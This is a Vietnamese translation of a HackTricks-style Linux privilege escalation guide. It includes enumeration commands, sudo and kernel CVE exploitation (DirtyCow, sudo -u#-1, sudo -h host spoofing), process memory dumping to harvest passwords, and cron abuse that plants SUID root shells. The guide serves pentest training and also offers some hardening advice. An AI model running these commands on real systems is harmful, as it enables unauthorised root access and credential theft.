# Leo thang đặc quyền Linux

{{#include ../../../banners/hacktricks-training.md}}

Để có thêm thông tin nền và tham khảo các quy trình enumeration trong lịch sử, hãy xem các tài nguyên g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation và linux-private-i được liệt kê trong phần tham khảo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Thông tin hệ thống

### Thông tin hệ điều hành

Hãy bắt đầu tìm hiểu về hệ điều hành đang chạy.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Đường dẫn

Nếu bạn **có quyền ghi vào bất kỳ thư mục nào trong biến `PATH`**, bạn có thể chiếm quyền một số thư viện hoặc binary:

```bash
echo $PATH
```

### Thông tin môi trường

Có thông tin hữu ích, mật khẩu hoặc API keys trong các biến môi trường không?

```bash
(env || set) 2>/dev/null
```

### Khai thác kernel

Kiểm tra phiên bản kernel và xem có exploit nào có thể dùng để nâng quyền hay không.

Mục [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) tập hợp các trường hợp nâng quyền cục bộ và liên kết đến các bài viết chuyên sâu hơn về Linux kernel trong Binary Exploitation. Hãy xác minh bản build và cấu hình bị ảnh hưởng trước khi thử nghiệm một trường hợp.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Bạn có thể tìm thấy danh sách kernel dễ bị tổn thương hữu ích và một số **exploit đã biên dịch** tại đây: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) và [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Một số trang khác có **exploit đã biên dịch**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Để trích xuất tất cả phiên bản kernel dễ bị tổn thương từ trang web đó, bạn có thể chạy:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Các công cụ có thể giúp tìm kiếm kernel exploit:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (chạy TRÊN máy nạn nhân, chỉ kiểm tra exploit cho kernel 2.x)

Luôn **tìm kiếm phiên bản kernel trên Google**, có thể phiên bản kernel của bạn được ghi trong một kernel exploit, khi đó bạn sẽ chắc chắn exploit này hợp lệ.

Các kỹ thuật khai thác kernel khác:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Leo thang đặc quyền Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Phiên bản Sudo

Dựa trên các phiên bản sudo dễ bị tổn thương xuất hiện trong:

```bash
searchsploit sudo
```

Bạn có thể kiểm tra xem phiên bản sudo có dễ bị tấn công hay không bằng grep này.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

sudo upstream **1.9.14 đến 1.9.17** cho phép người dùng cục bộ không có đặc quyền leo thang lên root thông qua tùy chọn `--chroot` khi sudo tải `/etc/nsswitch.conf` từ thư mục do người dùng kiểm soát; upstream đã khắc phục lỗi này trong **1.9.17p1**. Kiểm tra mọi binary sudo có root-setuid thực thi được trong các đường dẫn liên quan, vì `sudo -V` chỉ báo cáo binary được chọn bởi `PATH`. Các gói của bản phân phối có thể backport bản sửa lỗi mà không thay đổi chuỗi phiên bản upstream, vì vậy hãy kiểm tra cả trạng thái của gói từ nhà cung cấp. Xem [thông báo của maintainer sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Đây là một [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) để khai thác [lỗ hổng](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) đó. Trước khi chạy exploit, hãy đảm bảo phiên bản `sudo` của bạn dễ bị tấn công và hỗ trợ tính năng `chroot`.  

Để biết thêm thông tin, hãy tham khảo [thông báo lỗ hổng](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) gốc.<sup>[[28]](#references)</sup>

### Bypass quy tắc sudo dựa trên host (CVE-2025-32462)

sudo upstream **1.8.8 đến 1.9.17** có thể đánh giá quy tắc sudoers dựa trên host bằng **hostname do người dùng cung cấp** từ `sudo -h <host>` thay vì **hostname thực**; upstream đã khắc phục lỗi này trong **1.9.17p1**. Người dùng vẫn phải có mục sudoers phù hợp trên host được chọn. Hãy xem xét cả các bản backport của nhà cung cấp và các binary sudo thay thế, cũng như chính sách cục bộ. Xem [thông báo của maintainer sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Yêu cầu:
- Phiên bản sudo dễ bị tấn công
- Quy tắc sudoers dành riêng cho host (host không phải hostname hiện tại và cũng không phải `ALL`)

Mẫu sudoers ví dụ:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Khai thác bằng cách spoofing host được cho phép:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Nếu việc phân giải tên đã chọn bị chặn, hãy xác minh cách tên đó được phân giải trên máy chủ. Việc chỉ thấy một tên trong nhật ký hoặc tệp cấu hình không có nghĩa là tên đó có thể phân giải được, và việc thay đổi `/etc/hosts` thường đòi hỏi quyền ghi đặc quyền.

#### sudo < v1.8.28

Lỗ hổng [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) này đòi hỏi phải có một quy tắc sudo hiệu lực cho phép chạy lệnh với tư cách người dùng `ALL` nhưng loại trừ root, chẳng hạn như `(ALL, !root) /bin/bash`. Người gọi cũng phải được phép sử dụng quy tắc đó, bao gồm cả mọi yêu cầu xác thực. Hãy kiểm tra thông báo bảo mật của gói đã cài đặt: các nhà cung cấp đã backport bản sửa lỗi vào những bản phát hành có phiên bản upstream hiển thị vẫn thấp hơn 1.8.28. Chỉ có quy tắc `!root` hoặc phiên bản cũ thì chưa đủ để xác nhận hệ thống bị ảnh hưởng. Không kiểm tra lệnh đặc quyền trong quá trình liệt kê thụ động.

```
sudo -u#-1 /bin/bash
```

### Dmesg xác minh chữ ký thất bại

Tham khảo **box smasher2 của HTB** để xem **ví dụ** về cách khai thác lỗ hổng này.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Liệt kê thêm thông tin hệ thống

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Liệt kê các biện pháp phòng thủ khả thi

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Nếu bạn đang ở bên trong container, hãy bắt đầu với phần bảo mật container sau đó chuyển sang các trang về lạm dụng runtime cụ thể:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Ổ đĩa

Kiểm tra **những gì đang được mount và unmount**, ở đâu và vì sao. Nếu có thứ gì chưa được mount, bạn có thể thử mount nó và kiểm tra thông tin riêng tư.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Phần mềm hữu ích

Liệt kê các tệp nhị phân hữu ích

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ngoài ra, hãy kiểm tra xem **có trình biên dịch nào được cài đặt không**. Điều này hữu ích nếu bạn cần sử dụng một kernel exploit, vì bạn nên biên dịch nó trên máy sẽ dùng nó (hoặc trên một máy tương tự).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Phần mềm dễ bị tổn thương đã cài đặt

Kiểm tra **phiên bản của các gói và dịch vụ đã cài đặt**. Có thể có một phiên bản Nagios cũ (ví dụ) có thể bị khai thác để leo thang đặc quyền…\
Bạn nên kiểm tra thủ công phiên bản của những phần mềm đáng ngờ hơn đã cài đặt.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Nếu bạn có quyền truy cập SSH vào máy, bạn cũng có thể dùng **openVAS** để kiểm tra phần mềm lỗi thời và dễ bị tấn công được cài đặt trên máy.

> [!NOTE] > _Lưu ý rằng các lệnh này sẽ hiển thị rất nhiều thông tin, phần lớn không hữu ích. Vì vậy, nên dùng một số ứng dụng như OpenVAS hoặc công cụ tương tự để kiểm tra xem phiên bản phần mềm nào đã cài đặt có dễ bị tấn công bằng các exploit đã biết hay không._

## Processes

Hãy xem **những tiến trình nào** đang chạy và kiểm tra xem có tiến trình nào có **nhiều quyền hơn mức cần thiết** hay không (ví dụ: tomcat đang chạy dưới quyền root?)

```bash
ps aux
ps -ef
top -n 1
```

Luôn kiểm tra xem có [**electron/cef/chromium debuggers** nào đang chạy không; bạn có thể abuse chúng để leo thang đặc quyền](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** phát hiện chúng bằng cách kiểm tra tham số `--inspect` trong command line của process.\
Ngoài ra, hãy **kiểm tra quyền của bạn đối với các binary của process**; có thể bạn ghi đè được binary của ai đó.

### Chuỗi parent-child giữa các user

Một child process chạy dưới **user khác** với parent của nó không tự động là dấu hiệu độc hại, nhưng đây là một **tín hiệu hữu ích để phân loại**. Một số chuyển đổi là bình thường (`root` khởi chạy service user, login manager tạo các process phiên đăng nhập), nhưng những chuỗi bất thường có thể hé lộ wrapper, debug helper, persistence hoặc ranh giới tin cậy runtime yếu.

Kiểm tra nhanh:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Nếu phát hiện một chuỗi bất thường, hãy kiểm tra command line của tiến trình cha và tất cả các file ảnh hưởng đến hành vi của nó (`config`, `EnvironmentFile`, helper scripts, working directory, các đối số có thể ghi). Trong một số đường dẫn privesc thực tế, bản thân tiến trình con không thể ghi được, nhưng **config do tiến trình cha kiểm soát** hoặc chuỗi helper thì có thể.

### Executable đã bị xóa và file đang mở đã bị xóa

Các hiện vật runtime thường vẫn có thể truy cập được **sau khi bị xóa**. Điều này hữu ích cho cả việc leo thang đặc quyền lẫn khôi phục bằng chứng từ một tiến trình đang mở các file nhạy cảm.

Kiểm tra các executable đã bị xóa:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Nếu `/proc/<PID>/exe` trỏ đến `(deleted)`, tiến trình vẫn đang chạy ảnh binary cũ từ bộ nhớ. Đây là dấu hiệu đáng chú ý cần điều tra vì:

- executable đã bị xóa có thể chứa các chuỗi hoặc thông tin xác thực đáng chú ý
- tiến trình đang chạy vẫn có thể để lộ các file descriptor hữu ích
- binary đặc quyền đã bị xóa có thể cho thấy có hành vi can thiệp gần đây hoặc nỗ lực dọn dẹp

Thu thập các tệp đã bị xóa nhưng vẫn đang mở trên toàn hệ thống:

```bash
lsof +L1
```

Nếu tìm thấy một descriptor thú vị, hãy khôi phục nó trực tiếp:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Điều này đặc biệt hữu ích khi một tiến trình vẫn đang mở một secret, script, bản xuất cơ sở dữ liệu hoặc flag file đã bị xóa.

### Giám sát tiến trình

Bạn có thể dùng các công cụ như [**pspy**](https://github.com/DominicBreuker/pspy) để giám sát tiến trình. Công cụ này có thể rất hữu ích để xác định các tiến trình dễ bị tấn công được thực thi thường xuyên hoặc khi một nhóm điều kiện được đáp ứng.

#### Linux ProcMon với sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) có thể theo dõi các tiến trình và lệnh gọi hệ thống được chọn, đồng thời lưu trace SQLite. Nếu `sudo -l` cho phép chạy lệnh `procmon` có khả năng root mà không bị giới hạn, hãy cân nhắc liệu lệnh đó có thể quan sát đầu vào hoặc đầu ra của tiến trình thuộc người dùng khác hay không. Quyền này chỉ là một gợi ý cần kiểm tra: khả năng hỗ trợ tracer, chính sách thực tế và hoạt động của một tiến trình phù hợp đều là yếu tố quan trọng. Trace file có thể chứa secret, vì vậy hãy kiểm tra cẩn thận các bản xuất được phép và tránh thu thập dữ liệu từ các tiến trình không liên quan.

### Bộ nhớ tiến trình

Một số dịch vụ trên máy chủ lưu **credential dưới dạng văn bản thuần trong bộ nhớ**.\
Thông thường, bạn cần **quyền root** để đọc bộ nhớ của các tiến trình thuộc người dùng khác, vì vậy cách này thường hữu ích hơn khi bạn đã có quyền root và muốn tìm thêm credential.\
Tuy nhiên, hãy nhớ rằng **người dùng thông thường có thể đọc bộ nhớ của các tiến trình do chính họ sở hữu**.

> [!WARNING]
> Lưu ý rằng hiện nay hầu hết các máy **không cho phép ptrace theo mặc định**, điều đó có nghĩa là bạn không thể dump các tiến trình khác thuộc về người dùng không có đặc quyền của mình.
>
> File _**/proc/sys/kernel/yama/ptrace_scope**_ kiểm soát quyền truy cập ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: có thể debug mọi tiến trình, miễn là chúng có cùng uid. Đây là cách ptracing hoạt động theo kiểu cổ điển.
> - **kernel.yama.ptrace_scope = 1**: chỉ tiến trình cha mới có thể được debug.
> - **kernel.yama.ptrace_scope = 2**: chỉ admin mới có thể dùng ptrace, vì thao tác này yêu cầu capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: không tiến trình nào có thể bị theo dõi bằng ptrace. Sau khi thiết lập giá trị này, cần khởi động lại để bật lại ptracing.

Một tiến trình cùng UID tạm thời mở khóa password vault có thể tạo ra một ranh giới credential riêng. Khi được phép tracing, một tiến trình đang hoạt động và có thể dump có thể để lộ mật khẩu vault thông qua các syscall đầu vào hoặc bộ nhớ, dù file vault được mã hóa vẫn được bảo vệ. `ptrace_scope=0` chỉ là một điều kiện tiên quyết: credential trùng khớp, khả năng dump của tiến trình đích, các Linux security module khác và thời gian tồn tại của tiến trình cũng rất quan trọng. Việc một mục trong vault có thể dùng để đăng nhập Unix với quyền root hay không cần được kiểm tra riêng về khả năng tái sử dụng credential. Hoạt động dò tìm thông thường chỉ nên báo cáo chính sách và tiến trình hoặc đường dẫn vault tiềm năng, không thu thập đầu vào hoặc in secret. Xem [tài liệu Yama của kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) và [kiểm tra quyền truy cập ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Nếu bạn có quyền truy cập bộ nhớ của một dịch vụ FTP (chẳng hạn), bạn có thể lấy Heap rồi tìm credential trong đó.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Tập lệnh GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Với một ID tiến trình cụ thể, **maps cho biết cách bộ nhớ được ánh xạ trong không gian địa chỉ ảo của tiến trình đó**; nó cũng hiển thị **quyền của từng vùng được ánh xạ**. Tệp giả **mem** **cho phép truy cập trực tiếp vào bộ nhớ của tiến trình**. Từ tệp **maps**, chúng ta biết **những vùng bộ nhớ nào có thể đọc được** và độ lệch của chúng. Chúng ta dùng thông tin này để **di chuyển đến các vị trí tương ứng trong tệp mem và trích xuất tất cả các vùng có thể đọc được** vào một tệp.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` cung cấp quyền truy cập vào bộ nhớ **vật lý** của hệ thống, không phải bộ nhớ ảo. Không gian địa chỉ ảo của kernel có thể được truy cập bằng /dev/kmem.\
Thông thường, chỉ **root** và nhóm **kmem** mới có thể đọc `/dev/mem`.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump cho Linux

ProcDump là phiên bản tái hiện trên Linux của công cụ ProcDump cổ điển thuộc bộ công cụ Sysinternals dành cho Windows. Tải công cụ tại [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Công cụ

Để dump bộ nhớ của một tiến trình, bạn có thể dùng:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Bạn có thể xóa yêu cầu root thủ công và dump tiến trình do bạn sở hữu
- Script A.5 từ [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (cần root)

### Thông tin xác thực từ bộ nhớ tiến trình

#### Ví dụ thủ công

Nếu bạn thấy tiến trình authenticator đang chạy:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Bạn có thể dump tiến trình (xem các phần trước để tìm những cách khác nhau để dump bộ nhớ của một tiến trình) và tìm kiếm thông tin xác thực trong bộ nhớ:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Công cụ [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sẽ **đánh cắp thông tin xác thực dạng văn bản thuần từ bộ nhớ** và từ một số **tệp phổ biến**. Công cụ cần quyền root để hoạt động chính xác.

| Tính năng                                           | Tên tiến trình       |
| --------------------------------------------------- | -------------------- |
| Mật khẩu GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)   | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                            | lightdm              |
| VSFTPd (các kết nối FTP đang hoạt động)              | vsftpd               |
| Apache2 (các phiên HTTP Basic Auth đang hoạt động)  | apache2              |
| OpenSSH (các phiên SSH đang hoạt động - sử dụng Sudo) | sshd:                |

#### Regex tìm kiếm/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Công việc theo lịch/Cron

### Crontab UI (alseambusher) chạy với quyền root – leo thang đặc quyền qua bộ lập lịch trên web

Nếu một bảng điều khiển web “Crontab UI” (alseambusher/crontab-ui) chạy với quyền root và chỉ bind vào loopback, bạn vẫn có thể truy cập nó qua SSH local port-forwarding và tạo một job đặc quyền để leo thang.<sup>[[1]](#references)[[4]](#references)</sup>

Chuỗi khai thác điển hình
- Phát hiện cổng chỉ bind vào loopback (ví dụ: 127.0.0.1:8000) và Basic-Auth realm qua `ss -ntlp` / `curl -v localhost:8000`
- Tìm thông tin đăng nhập trong các tệp phục vụ vận hành:
  - Bản sao lưu/script có `zip -P <password>`
  - systemd unit để lộ `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tạo tunnel và đăng nhập:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Tạo một job quyền cao và chạy ngay lập tức (tạo SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Sử dụng nó:
```bash
/tmp/rootshell -p   # root shell
```

Củng cố bảo mật
- Không chạy Crontab UI với quyền root; dùng một user chuyên biệt và giới hạn quyền ở mức tối thiểu
- Bind vào localhost và đồng thời hạn chế truy cập bằng firewall/VPN; không dùng lại mật khẩu
- Tránh nhúng secret vào unit file; dùng secret store hoặc EnvironmentFile chỉ root mới có quyền truy cập
- Bật audit/logging cho các lần thực thi job theo yêu cầu

Kiểm tra xem có scheduled job nào dễ bị tấn công không. Có thể bạn tận dụng được script chạy với quyền root (lỗ hổng wildcard? sửa được các file mà root sử dụng? dùng symlink? tạo các file cụ thể trong thư mục mà root sử dụng?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Nếu sử dụng `run-parts`, hãy kiểm tra những tên nào sẽ thực sự được thực thi:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Điều này giúp tránh các kết quả dương tính giả. Thư mục định kỳ có quyền ghi chỉ hữu ích nếu tên tệp payload của bạn khớp với các quy tắc `run-parts` trên hệ thống.

### Đường dẫn Cron

Ví dụ, trong _/etc/crontab_, bạn có thể tìm thấy PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Lưu ý rằng người dùng "user" có quyền ghi vào /home/user_)

Nếu trong crontab này, người dùng root cố thực thi một lệnh hoặc script mà không thiết lập đường dẫn. Ví dụ: _\* \* \* \* root overwrite.sh_\
Khi đó, bạn có thể lấy được shell root bằng cách sử dụng:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron sử dụng script có wildcard (Wildcard Injection)

Nếu một script được root thực thi có chứa “**\***” bên trong một lệnh, bạn có thể khai thác điều này để thực hiện những việc ngoài dự kiến (như privesc). Ví dụ:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Nếu wildcard được đặt trước bởi một đường dẫn như** _**/some/path/\***_ **, thì nó không dễ bị khai thác (ngay cả** _**./\***_ **cũng không).**

Đọc trang sau để biết thêm các thủ thuật khai thác wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Chèn lệnh qua mở rộng số học Bash trong trình phân tích log cron

Bash có thể diễn giải văn bản không đáng tin cậy thành một biểu thức số học. Trong một số ngữ cảnh Bash bị ảnh hưởng, chỉ số mảng bên trong biểu thức đó có thể đánh giá một phép thay thế lệnh. Nếu cron/trình phân tích có đặc quyền đưa văn bản log do kẻ tấn công kiểm soát vào phép so sánh số học như vậy, phép thay thế có thể chạy với danh tính của trình phân tích.<sup>[[22]](#references)</sup> Điều này phụ thuộc vào biểu thức Bash và phiên bản cụ thể; bản thân chuỗi `$(...)0` trần trong một biến đã mở rộng không phải là minh họa đáng tin cậy cho việc đánh giá lại.

Dữ liệu đầu vào cũng có thể đến từ metadata của tệp hoặc một trường khác được đọc từ vị trí mà người dùng có thể ghi. Ví dụ: một script dọn dẹp có đặc quyền đọc thẻ `Producer` của ảnh rồi so sánh bằng `[[ "$producer" -eq "expected" ]]` sẽ thực hiện phép so sánh số học, dù biến được đặt trong dấu ngoặc kép. Hãy xác định danh tính chạy tác vụ được lên lịch, những tệp nào có thể cung cấp thẻ, mọi phép biến đổi trước khi so sánh và hành vi chính xác của Bash. Với nhãn văn bản, hãy dùng phép so sánh chuỗi; với số, hãy xác thực rằng đầu vào chỉ gồm chữ số thập phân trước khi tính toán. Xem [các quy tắc số học của Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Mẫu thường dễ bị tấn công:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Thăm dò hành vi cục bộ an toàn đối với cơ chế array-subscript (không có tiến trình đặc quyền hoặc thay đổi tệp):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Truy vết script được lập lịch thực tế và đường dẫn đầu vào chính xác mà nó mở. Ngay cả khi không thể ghi vào chính tệp log, người dùng có quyền ghi và truy cập thư mục cha không có sticky bit vẫn có thể thay thế mục nhập thư mục của tệp; `namei -l` giúp phân biệt các quyền này. Một đường dẫn log khác có thể ghi, scheduler không thể đọc được hoặc parser không bao giờ đánh giá trường đó dưới dạng phép tính số học của Bash đều không chứng minh được khả năng khai thác theo cách này.

### Ghi đè cron script và symlink

Nếu bạn **có thể sửa đổi một cron script** được thực thi bởi root, bạn có thể dễ dàng lấy được shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Nếu script được root thực thi sử dụng một **thư mục mà bạn có toàn quyền truy cập**, có thể hữu ích nếu xóa thư mục đó rồi **tạo một thư mục symlink trỏ đến thư mục khác** chứa script do bạn kiểm soát.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Xác thực symlink và xử lý tệp an toàn hơn

Khi rà soát các script/binary có đặc quyền đọc hoặc ghi tệp theo đường dẫn, hãy kiểm tra cách chúng xử lý các link:

- `stat()` đi theo symlink và trả về metadata của đích.
- `lstat()` trả về metadata của chính link.
- `readlink -f` và `namei -l` giúp phân giải đích cuối cùng và hiển thị quyền của từng thành phần trong đường dẫn.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Đối với người phòng thủ/nhà phát triển, các cách an toàn hơn để chống thủ thuật symlink gồm:

- `O_EXCL` cùng với `O_CREAT`: thất bại nếu đường dẫn đã tồn tại (chặn các link/tệp do kẻ tấn công tạo sẵn).
- `openat()`: thao tác tương đối với file descriptor của một thư mục đáng tin cậy.
- `mkstemp()`: tạo tệp tạm thời một cách nguyên tử với quyền truy cập an toàn.

### Binary cron được ký tùy chỉnh nhưng có payload ghi được
